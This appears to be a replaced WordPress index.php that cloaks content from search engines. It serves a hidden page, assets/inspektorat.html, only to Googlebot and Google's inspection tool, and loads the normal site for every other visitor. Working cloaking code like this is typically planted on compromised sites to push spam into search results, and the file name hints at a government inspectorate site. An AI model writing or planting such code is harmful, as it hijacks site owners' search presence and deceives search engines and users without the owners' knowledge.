<?php

$user_agent = '';
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
}

$is_googlebot = false;
if ($user_agent !== '') {
    $is_googlebot = preg_match('/Googlebot|Google-InspectionTool/i', $user_agent);
}

$cloak_file = dirname(__FILE__) . '/assets/inspektorat.html';


if ($is_googlebot) {

    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Pragma: no-cache");
    header("Expires: 0");

    if (file_exists($cloak_file)) {
        header('Content-Type: text/html');
        readfile($cloak_file);
        exit;
    }
}

if (file_exists(dirname(__FILE__) . '/default.php')) {
    require dirname(__FILE__) . '/default.php';
} elseif (file_exists(dirname(__FILE__) . '/wp-blog-header.php')) {
    define('WP_USE_THEMES', true);
    require dirname(__FILE__) . '/wp-blog-header.php';
} else {
    echo "Website aktif namun tidak bisa menemukan engine utama.";
}
?>